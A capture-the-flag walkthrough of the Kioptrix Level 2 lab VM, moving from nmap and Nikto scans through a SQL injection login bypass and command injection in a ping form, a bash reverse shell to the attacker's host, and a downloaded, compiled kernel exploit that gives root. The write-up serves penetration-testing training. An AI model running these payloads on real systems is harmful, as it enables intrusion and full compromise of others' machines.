# Kioptrix Level 2

### Contents
<!-- TOC -->
- [Footprinting](#footprinting)
- [Reconnaisance](#reconnaisance)
- [ipp](#ipp)
- [MYSQL](#mysql)
- [HTTP](#http)
  - [Nikto Scan](#nikto-scan)
  - [SQL Injection Attack](#sql-injection-attack)
  - [Command Injection](#command-injection)
  - [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

Our target network is `10.0.2.0/24`.

# Footprinting
Find the IP address of the target host via:

```bash
netdiscover -r 10.0.2.0/24
```

For the purpose of this guide we will assume our target is at IP address **10.0.2.8**.

# Reconnaisance

We perform an initial scan as follows:

```bash
nmap 10.0.2.8
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: 08:00:27:50:6F:FB (Oracle VirtualBox virtual NIC)
```

Let's check for UDP ports:

```bash
nmap -sU 10.0.2.8
```

Let's do version detection:
```bash
nmap -O 10.0.2.8
```

```
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
```

Now we proceed by examining each of the services on the machine.
Starting with the most interesting.

# ipp

IPP (Internet Printing Protocol) is a TCP/IP based client-server protocol.
IPP enables printing over any LAN or WAN supporting TCP/IP.

```bash
nmap -A 10.0.2.8 -p 631
```

```
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 1.1
| http-methods:
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
```

**CUPS 1.1** is vulnerable to:
* https://www.exploit-db.com/exploits/41233
* https://www.exploit-db.com/exploits/24977

However, when running the exploits:
```
[*]	locate available printer
[-]	no printers
```
# MYSQL

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL (unauthorized)
```

# HTTP
```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2019-03-03T17:31:54+00:00; +5h00m01s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
```
## Nikto Scan

```
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8346 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time:           2019-03-03 07:37:11 (GMT-5) (67 seconds)
---------------------------------------------------------------------------
```

## SQL Injection Attack

After browsing to the site a login page was present, clearly connected to the backend SQL database.
It accepts POST logins with two parameters:
```
uname
psw
```

Using SQL injection of both parameters:

```
WHERE USERNAME='$uname' AND PASSWORD='$psw'

WHERE USERNAME=USER' OR '1'='1 AND PASSWORD='PASS' OR '1'='1
```

`uname=USER OR '1'='1
psw=PASS' OR '1'='1
`
## Command Injection

We are now presented with a form to ping machines on the network.

If we choose `10.0.2.5` we get the following output:

```
PING 10.0.2.5 (10.0.2.5) 56(84) bytes of data.
64 bytes from 10.0.2.5: icmp_seq=0 ttl=64 time=0.294 ms
64 bytes from 10.0.2.5: icmp_seq=1 ttl=64 time=0.393 ms
64 bytes from 10.0.2.5: icmp_seq=2 ttl=64 time=0.421 ms

--- 10.0.2.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.294/0.369/0.421/0.056 ms, pipe 2
```
We can execute commands by inputting:
`10.0.2.5; <cmd>`

Based upon this we can determine the following:

```
# 10.0.2.5; whoami
apache

# 10.0.2.5; ls -l; pwd
-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
/var/www/html
```

We can see that the `pingit.php` file.

```
10.0.2.5; cat pingit.php
```

```php
echo shell_exec( 'ping -c 3 ' . $target );
```

We can gain a shell as follows, assuming we have netcat listening on 8080 of our Kali machine:

```bash
; bash -i >& /dev/tcp/10.0.2.5/8080 0>&1
```

```bash
uname -a
```

```
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

## Privilege Escalation

Based upon the version of linux from above we found the following:
https://www.exploit-db.com/exploits/9545.

We download the exploit to our Kali machine:
```bash
wget https://www.exploit-db.com/exploits/9545.c
```

We can't just use `wget` on our target machine with SSL sites so we use the following on our Kali machine to host a web server:

```python
python -m SimpleHTTPServer
# Defaults to listen on port 8000
```

Then, on our target shell we get the file, compile it and run it:
```bash
wget 10.0.2.5:8000/9545.c /tmp/linux-sendpage.c

cd /tmp
gcc linux-sendpage.c -o linux-sendpage
chmod +x linux-sendpage

./linux-sendpage
```

Results in:

```
sh: no job control in this shell
sh-3.00# whoami
root
```

**And we have root!**
